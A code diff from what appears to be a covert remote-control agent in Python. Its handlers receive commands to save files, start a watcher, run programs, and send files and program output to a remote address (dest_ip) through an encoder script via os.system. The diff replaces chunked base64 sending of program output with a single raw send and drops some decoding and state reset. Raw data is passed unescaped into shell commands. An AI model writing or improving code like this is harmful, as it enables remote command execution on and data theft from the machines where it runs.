@@ -259,14 +259,8 @@ def run_program(file_path):
         )
         output = f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
         
-        # Base64 encode and chunk
-        encoded = base64.b64encode(output.encode()).decode()
-        total_chunks = (len(encoded) / 16)
-        
-        # Send each chunk
-        for i in range(total_chunks):
-            chunk = encoded[i*16:(i+1)*16]
-            os.system(f'python3 encoder.py PT:{dest_ip} "{chunk}')
+        # send the output back to the encoder script
+        os.system(f'python3 encoder.py PT:{dest_ip} "{output}"')
             
     except Exception as e:
         subprocess.run([
@@ -283,17 +277,14 @@ def handle_data(decoded_data):
         case 3:
             save_file(decoded_data)
         case 4:
-            decoded_data = decoded_data.decode('utf-8')
             print(f"Watcher command received: {decoded_data}")
             start_watcher(decoded_data)
         case 6:
-            decoded_data = decoded_data.decode('utf-8')
             print(f"Sending File")
             os.system(f'python3 encoder.py FT:{dest_ip} "{decoded_data}"')
         case 7:
+            print(f"Run program command received: {decoded_data}")
             run_program(decoded_data)
-
-    reset_state()
 
 def save_file(decoded_data):
     """Save the file from the decoded data."""
